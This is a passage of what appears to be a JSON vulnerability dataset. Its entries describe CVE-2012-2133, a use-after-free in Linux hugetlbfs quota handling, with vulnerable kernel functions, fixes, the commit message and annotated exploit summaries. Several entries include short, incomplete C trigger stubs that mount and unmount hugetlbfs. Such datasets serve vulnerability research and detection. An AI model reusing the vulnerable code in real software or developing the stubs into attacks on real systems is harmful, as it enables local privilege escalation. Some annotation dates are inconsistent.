            "fs/hugetlbfs/inode.c": "static void hugetlbfs_put_super(struct super_block *sb)\n{\n\tstruct hugetlbfs_sb_info *sbi = HUGETLBFS_SB(sb);\n \n \tif (sbi) {\n \t\tsb->s_fs_info = NULL;\n \t\tkfree(sbi);\n \t}\n }\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nUse-after-free in Linux kernel hugetlbfs\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 when huge pages are enabled\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors | Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.\n\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's hugetlbfs filesystem implementation. When huge pages are enabled, improper handling of quota data during a umount operation can lead to a use-after-free condition. This allows local attackers to potentially crash the system or escalate privileges by interacting with the hugetlbfs filesystem.\n\n[Mandatory] Root cause:\nImproper reference counting and quota handling in hugetlbfs_put_super() leads to use-after-free when freeing the superblock.\n\n[Mandatory] Attack Surface:\nLinux kernel hugetlbfs filesystem implementation\n\n[Mandatory] Impact Summary:\nLocal privilege escalation or denial of service\n\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n\n[Mandatory] Key code/struct excerpt (minimal):\nstatic void hugetlbfs_put_super(struct super_block *sb)\n{\n\tstruct hugetlbfs_sb_info *sbi = HUGETLBFS_SB(sb);\n \n\tif (sbi) {\n\t\tsb->s_fs_info = NULL;\n\t\tkfree(sbi);\n\t}\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem operations (umount)\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free memory corruption\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled by local attacker through filesystem operations, requires hugetlbfs configuration.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Mount hugetlbfs filesystem\n- Perform operations to trigger quota handling\n- Unmount filesystem to trigger use-after-free\n- Potential privilege escalation via kernel memory corruption\n\n[Mandatory] Exploitation Example script payload code:\nNA\n\nFix\n[Mandatory] Fix code:\nstatic void hugetlbfs_put_super(struct super_block *sb)\n{\n\tstruct hugetlbfs_sb_info *sbi = HUGETLBFS_SB(sb);\n \n\tif (sbi) {\n\t\tsb->s_fs_info = NULL;\n\n\t\tif (sbi->spool)\n\t\t\thugepage_put_subpool(sbi->spool);\n\n\t\tkfree(sbi);\n\t}\n}\n\n[Mandatory] Fix summary:\nAdded proper cleanup of quota subpool before freeing memory to prevent use-after-free condition.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nWhat did the fix do? Added proper subpool cleanup before freeing memory.\nField: PatchType: Resource management fix\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem put_super implementations\n- Check for similar quota handling issues\n- Audit kernel's reference counting patterns\n\n[Optional] Likely variants/impact (one line):\nSimilar reference counting issues in other filesystems.",
        "tests": "NA",
        "solutions": "static void hugetlbfs_put_super(struct super_block *sb)\n{\n\tstruct hugetlbfs_sb_info *sbi = HUGETLBFS_SB(sb);\n \n \tif (sbi) {\n \t\tsb->s_fs_info = NULL;\n\n\t\tif (sbi->spool)\n\t\t\thugepage_put_subpool(sbi->spool);\n\n \t\tkfree(sbi);\n \t}\n }\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/hugetlbfs/inode.c": "static int hugetlbfs_statfs(struct dentry *dentry, struct kstatfs *buf)\n{\n\tstruct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(dentry->d_sb);\n\tstruct hstate *h = hstate_inode(dentry->d_inode);\n\n\tbuf->f_type = HUGETLBFS_MAGIC;\n\tbuf->f_bsize = huge_page_size(h);\n\tif (sbinfo) {\n \t\tspin_lock(&sbinfo->stat_lock);\n \t\t/* If no limits set, just report 0 for max/free/used\n \t\t * blocks, like simple_statfs() */\n\t\tif (sbinfo->max_blocks >= 0) {\n\t\t\tbuf->f_blocks = sbinfo->max_blocks;\n\t\t\tbuf->f_bavail = buf->f_bfree = sbinfo->free_blocks;\n \t\t\tbuf->f_files = sbinfo->max_inodes;\n \t\t\tbuf->f_ffree = sbinfo->free_inodes;\n \t\t}\n\t\tspin_unlock(&sbinfo->stat_lock);\n\t}\n\tbuf->f_namelen = NAME_MAX;\n\treturn 0;\n}\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nLinux kernel hugetlbfs use-after-free vulnerability\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 (with huge pages enabled)\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399 (Resource Management Errors)\n[Mandatory] Summary:\nThe vulnerability exists in the Linux kernel's hugetlbfs filesystem implementation when handling quota data. A local user can trigger a use-after-free condition by interacting with a hugetlbfs filesystem during a umount operation, potentially causing a denial of service (system crash) or privilege escalation. The bug occurs when free_huge_page() is delayed until after the associated inode has been freed.\n[Mandatory] Root cause:\nUse-after-free in hugetlbfs quota handling due to improper reference counting during filesystem unmount.\n[Mandatory] Attack Surface:\nLinux kernel hugetlbfs filesystem interface\n[Mandatory] Impact Summary:\nSystem crash (DoS) or possible privilege escalation\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (sbinfo->max_blocks >= 0) {\n    buf->f_blocks = sbinfo->max_blocks;\n    buf->f_bavail = buf->f_bfree = sbinfo->free_blocks;\n    buf->f_files = sbinfo->max_inodes;\n    buf->f_ffree = sbinfo->free_inodes;\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem operations (umount)\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free condition leading to memory corruption\n\n[Mandatory] Exploitability summary (1 sentence):\nAn attacker with local access can trigger the vulnerability through filesystem operations to potentially execute arbitrary code or crash the system.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Mount a hugetlbfs filesystem\n- Perform operations to delay free_huge_page()\n- Trigger umount on the filesystem\n- Exploit the resulting use-after-free condition\n- Potential privilege escalation or DoS\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <sys/mount.h>\n\nint main() {\n    // Mount hugetlbfs (requires appropriate permissions)\n    mount(\"none\", \"/mnt/huge\", \"hugetlbfs\", 0, NULL);\n    \n    // Perform operations to trigger the vulnerability\n    // Calls that keep references to hugepages during umount\n    \n    // Trigger umount\n    umount(\"/mnt/huge\");\n    \n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nif (sbinfo->spool) {\n    long free_pages;\n\n    spin_lock(&sbinfo->spool->lock);\n    buf->f_blocks = sbinfo->spool->max_hpages;\n    free_pages = sbinfo->spool->max_hpages\n        - sbinfo->spool->used_hpages;\n    buf->f_bavail = buf->f_bfree = free_pages;\n    spin_unlock(&sbinfo->spool->lock);\n    buf->f_files = sbinfo->max_inodes;\n    buf->f_ffree = sbinfo->free_inodes;\n}\n```\n\n[Mandatory] Fix summary:\nThe fix introduces the concept of a hugepage \"subpool\" to properly manage references and prevent use-after-free, adding proper locking around quota operations.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType (e.g., bounds check added, logic refactor, feature removal)\nThe patch refactors the quota handling to use a subpool mechanism with proper reference counting.\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota implementations for similar issues\n- Check memory management in other hugepage-related subsystems\n- Analyze reference counting in virtual memory handlers\n\n[Optional] Likely variants/impact (one line):\nSimilar reference counting issues could exist in other filesystem quota implementations.",
        "tests": "NA",
        "solutions": "static int hugetlbfs_statfs(struct dentry *dentry, struct kstatfs *buf)\n{\n\tstruct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(dentry->d_sb);\n\tstruct hstate *h = hstate_inode(dentry->d_inode);\n\n\tbuf->f_type = HUGETLBFS_MAGIC;\n\tbuf->f_bsize = huge_page_size(h);\n\tif (sbinfo) {\n \t\tspin_lock(&sbinfo->stat_lock);\n \t\t/* If no limits set, just report 0 for max/free/used\n \t\t * blocks, like simple_statfs() */\n\t\tif (sbinfo->spool) {\n\t\t\tlong free_pages;\n\n\t\t\tspin_lock(&sbinfo->spool->lock);\n\t\t\tbuf->f_blocks = sbinfo->spool->max_hpages;\n\t\t\tfree_pages = sbinfo->spool->max_hpages\n\t\t\t\t- sbinfo->spool->used_hpages;\n\t\t\tbuf->f_bavail = buf->f_bfree = free_pages;\n\t\t\tspin_unlock(&sbinfo->spool->lock);\n \t\t\tbuf->f_files = sbinfo->max_inodes;\n \t\t\tbuf->f_ffree = sbinfo->free_inodes;\n \t\t}\n\t\tspin_unlock(&sbinfo->stat_lock);\n\t}\n\tbuf->f_namelen = NAME_MAX;\n\treturn 0;\n}\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "mm/hugetlb.c": " static struct page *alloc_huge_page(struct vm_area_struct *vma,\n \t\t\t\t    unsigned long addr, int avoid_reserve)\n {\n \tstruct hstate *h = hstate_vma(vma);\n \tstruct page *page;\n\tstruct address_space *mapping = vma->vm_file->f_mapping;\n\tstruct inode *inode = mapping->host;\n \tlong chg;\n \n \t/*\n\t * Processes that did not create the mapping will have no reserves and\n\t * will not have accounted against quota. Check that the quota can be\n\t * made before satisfying the allocation\n\t * MAP_NORESERVE mappings may also need pages and quota allocated\n\t * if no reserve mapping overlaps.\n \t */\n \tchg = vma_needs_reservation(h, vma, addr);\n \tif (chg < 0)\n \t\treturn ERR_PTR(-VM_FAULT_OOM);\n \tif (chg)\n\t\tif (hugetlb_get_quota(inode->i_mapping, chg))\n \t\t\treturn ERR_PTR(-VM_FAULT_SIGBUS);\n \n \tspin_lock(&hugetlb_lock);\n\tpage = dequeue_huge_page_vma(h, vma, addr, avoid_reserve);\n\tspin_unlock(&hugetlb_lock);\n\n \tif (!page) {\n \t\tpage = alloc_buddy_huge_page(h, NUMA_NO_NODE);\n \t\tif (!page) {\n\t\t\thugetlb_put_quota(inode->i_mapping, chg);\n \t\t\treturn ERR_PTR(-VM_FAULT_SIGBUS);\n \t\t}\n \t}\n \n\tset_page_private(page, (unsigned long) mapping);\n \n \tvma_commit_reservation(h, vma, addr);\n \n\treturn page;\n}\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nUse-after-free in Linux kernel hugetlbfs quota handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 with huge pages enabled\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's handling of hugetlbfs quota data. Local users can trigger this flaw by interacting with a hugetlbfs filesystem during a umount operation, potentially causing a system crash or privilege escalation. The vulnerability occurs when free_huge_page() is delayed until after the associated inode has been freed.\n[Mandatory] Root cause:\nImproper reference counting in hugetlbfs quota handling leads to use-after-free when pages reference freed inode and superblock structures.\n[Mandatory] Attack Surface:\nLocal users interacting with hugetlbfs filesystem\n[Mandatory] Impact Summary:\nDenial of service or possible privilege escalation\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (chg)\n    if (hugetlb_get_quota(inode->i_mapping, chg))\n        return ERR_PTR(-VM_FAULT_SIGBUS);\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem operations\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free of inode/superblock structures\n\n[Mandatory] Exploitability summary:\nRequires local access and hugetlbfs interaction; timing-dependent but potentially reliable due to predictable kernel object lifecycles.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create hugetlbfs mount point\n- Map huge pages to create quota associations\n- Trigger umount while delaying page freeing\n- Potential to corrupt freed memory structures\n- May allow privilege escalation through memory corruption\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <unistd.h>\n\nint main() {\n    int fd = open(\"/mnt/huge/test\", O_CREAT|O_RDWR, 0755);\n    void *addr = mmap(NULL, 2*1024*1024, PROT_READ|PROT_WRITE, \n                     MAP_SHARED, fd, 0);\n    // Trigger quota operations\n    munmap(addr, 2*1024*1024);\n    // Simulate race condition with umount\n    system(\"umount /mnt/huge\");\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nif (chg)\n    if (hugepage_subpool_get_pages(spool, chg))\n        return ERR_PTR(-VM_FAULT_SIGBUS);\n```\n\n[Mandatory] Fix summary:\nReplaced inode-based quota handling with subpool system that maintains proper references, preventing use-after-free scenarios.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType: reference counting redesign\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota implementations\n- Check for similar delayed-free scenarios in memory management\n[Optional] Likely variants/impact (one line):\nSimilar reference counting issues may exist in other filesystem quota systems",
        "tests": "NA",
        "solutions": " static struct page *alloc_huge_page(struct vm_area_struct *vma,\n \t\t\t\t    unsigned long addr, int avoid_reserve)\n {\n\tstruct hugepage_subpool *spool = subpool_vma(vma);\n \tstruct hstate *h = hstate_vma(vma);\n \tstruct page *page;\n \tlong chg;\n \n \t/*\n\t * Processes that did not create the mapping will have no\n\t * reserves and will not have accounted against subpool\n\t * limit. Check that the subpool limit can be made before\n\t * satisfying the allocation MAP_NORESERVE mappings may also\n\t * need pages and subpool limit allocated allocated if no reserve\n\t * mapping overlaps.\n \t */\n \tchg = vma_needs_reservation(h, vma, addr);\n \tif (chg < 0)\n \t\treturn ERR_PTR(-VM_FAULT_OOM);\n \tif (chg)\n\t\tif (hugepage_subpool_get_pages(spool, chg))\n \t\t\treturn ERR_PTR(-VM_FAULT_SIGBUS);\n \n \tspin_lock(&hugetlb_lock);\n\tpage = dequeue_huge_page_vma(h, vma, addr, avoid_reserve);\n\tspin_unlock(&hugetlb_lock);\n\n \tif (!page) {\n \t\tpage = alloc_buddy_huge_page(h, NUMA_NO_NODE);\n \t\tif (!page) {\n\t\t\thugepage_subpool_put_pages(spool, chg);\n \t\t\treturn ERR_PTR(-VM_FAULT_SIGBUS);\n \t\t}\n \t}\n \n\tset_page_private(page, (unsigned long)spool);\n \n \tvma_commit_reservation(h, vma, addr);\n \n\treturn page;\n}\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "mm/hugetlb.c": "static void free_huge_page(struct page *page)\n{\n\t/*\n\t * Can't pass hstate in here because it is called from the\n\t * compound page destructor.\n \t */\n \tstruct hstate *h = page_hstate(page);\n \tint nid = page_to_nid(page);\n\tstruct address_space *mapping;\n \n\tmapping = (struct address_space *) page_private(page);\n \tset_page_private(page, 0);\n \tpage->mapping = NULL;\n \tBUG_ON(page_count(page));\n\tBUG_ON(page_mapcount(page));\n\tINIT_LIST_HEAD(&page->lru);\n\n\tspin_lock(&hugetlb_lock);\n\tif (h->surplus_huge_pages_node[nid] && huge_page_order(h) < MAX_ORDER) {\n\t\tupdate_and_free_page(h, page);\n\t\th->surplus_huge_pages--;\n\t\th->surplus_huge_pages_node[nid]--;\n\t} else {\n \t\tenqueue_huge_page(h, page);\n \t}\n \tspin_unlock(&hugetlb_lock);\n\tif (mapping)\n\t\thugetlb_put_quota(mapping, 1);\n }\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nUse-after-free in Linux kernel hugetlbfs quota handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: Not available in input\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 with huge pages enabled\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\nCVE-2012-2133: Use-after-free vulnerability in Linux kernel hugetlbfs\n\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's handling of hugetlbfs quota data when huge pages are enabled. The flaw occurs in the free_huge_page() function where a page's quota data may be accessed after the associated inode or superblock has been freed. This can be triggered by local users through interaction with a hugetlbfs filesystem, particularly during umount operations.\n\n[Mandatory] Root cause:\nImproper handling of quota data pointers during page deallocation leads to use-after-free conditions when the associated filesystem structures are freed.\n\n[Mandatory] Attack Surface:\nLinux kernel memory management, specifically hugetlbfs filesystem operations\n\n[Mandatory] Impact Summary:\nLocal privilege escalation or system crash\n\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nmapping = (struct address_space *) page_private(page);\nset_page_private(page, 0);\npage->mapping = NULL;\n...\nif (mapping)\n    hugetlb_put_quota(mapping, 1);\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem operations (umount)\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free of kernel memory objects\n\n[Mandatory] Exploitability summary (1 sentence):\nAttack requires local access and hugetlbfs usage, but timing can be controlled to trigger the flaw.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Allocate huge pages through hugetlbfs\n- Trigger page deallocation while unmounting filesystem\n- Manipulate timing to access freed quota structures\n- Possible privilege escalation via controlled memory corruption\n- Requires precise timing to exploit successfully\n\n[Mandatory] Exploitation Example script payload code:\n```c\n// Example local exploit triggering use-after-free\n#include <sys/mount.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nint main() {\n    // Create hugetlbfs mount point\n    mkdir(\"/tmp/hugetlb\", 0755);\n    mount(\"none\", \"/tmp/hugetlb\", \"hugetlbfs\", 0, NULL);\n    \n    // Open and map huge pages\n    int fd = open(\"/tmp/hugetlb/test\", O_CREAT|O_RDWR, 0755);\n    // ... map and use huge pages\n    \n    // Trigger umount while pages are being freed\n    umount(\"/tmp/hugetlb\");\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nstruct hugepage_subpool *spool =\n    (struct hugepage_subpool *)page_private(page);\n...\nhugepage_subpool_put_pages(spool, 1);\n```\n\n[Mandatory] Fix summary:\nThe fix introduces hugepage subpools to properly manage quota references, replacing the direct use of address_space pointers with subpool structures that have independent lifetime management.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType: Resource management refactor\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota implementations\n- Check for similar lifetime management issues in memory subsystems\n- Audit other page deallocation paths\n\n[Optional] Likely variants/impact (one line):\nPotential similar issues in other specialized filesystem implementations",
        "tests": "NA",
